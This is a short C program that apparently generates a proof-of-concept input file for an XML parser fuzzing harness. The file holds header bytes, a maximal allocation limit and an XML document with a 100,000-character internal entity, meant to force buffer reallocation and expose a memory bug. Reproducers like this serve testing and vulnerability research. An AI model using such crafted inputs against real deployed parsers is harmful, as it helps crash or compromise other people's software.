#include <stdio.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Write opts (4 bytes, big-endian, value 1 to enable entity fuzzing)
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x01, f);

    // Write maxAlloc (4 bytes, big-endian, large value to avoid allocation limits)
    fputc(0xFF, f); fputc(0xFF, f); fputc(0xFF, f); fputc(0xFF, f);

    // Write main URL string "test.xml" terminated by backslash-newline
    fputs("test.xml", f); fputc('\\', f); fputc('\n', f);

    // Write XML content with malformed internal entity
    fputs("<?xml version=\"1.0\"?>\n", f);
    fputs("<!DOCTYPE foo [\n", f);
    fputs("<!ENTITY x \"", f);
    // Long entity value to force buffer reallocation (100000 'A's)
    for (int i = 0; i < 100000; i++) {
        fputc('A', f);
    }
    fputs("\">\n", f);
    fputs("]>\n", f);
    fputs("<root>&x;</root>\n", f);

    fclose(f);
    return 0;
}